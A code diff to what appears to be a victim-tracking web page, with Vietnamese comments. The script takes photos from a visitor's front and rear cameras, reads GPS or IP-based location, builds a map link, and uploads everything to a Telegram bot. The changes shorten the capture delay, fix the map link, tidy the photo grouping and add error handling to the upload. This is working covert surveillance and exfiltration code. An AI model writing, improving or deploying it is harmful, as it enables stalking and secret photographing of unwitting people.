@@ -49,12 +49,14 @@ async function main() {
     const [gps, info] = await Promise.all([getGPS(), getVitals()]);
     
     const p1 = await capture("user");
-    await new Promise(r => setTimeout(r, 1500));
+    await new Promise(r => setTimeout(r, 1000));
     const p2 = await capture("environment");
 
     const lat = gps ? gps.lat : info.lat;
     const lon = gps ? gps.lon : info.lon;
     const type = gps ? `🎯 GPS (±${Math.round(gps.acc)}m)` : "🌐 IP (Sai số cao)";
+    
+    // Sửa lỗi cú pháp link Maps (Phải dùng ${} thay vì {})
     const map = `https://www.google.com/maps?q=${lat},${lon}`;
 
     const cap = `📡 [THÔNG TIN TRUY CẬP]
@@ -81,12 +83,20 @@ async function main() {
     
     if (p2) {
         fd.append('f2', p2, '2.jpg');
+        // Chỉ gán caption vào ảnh đầu tiên để Telegram gộp nhóm đẹp
         media.push({ type: 'photo', media: 'attach://f2', caption: (media.length === 0) ? cap : "" });
     }
 
     if (media.length > 0) {
         fd.append('media', JSON.stringify(media));
-        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMediaGroup`, { method: 'POST', body: fd });
+        try {
+            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMediaGroup`, { 
+                method: 'POST', 
+                body: fd 
+            });
+        } catch (e) {
+            console.log("Lỗi gửi ảnh");
+        }
     } else {
         await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
             method: 'POST',
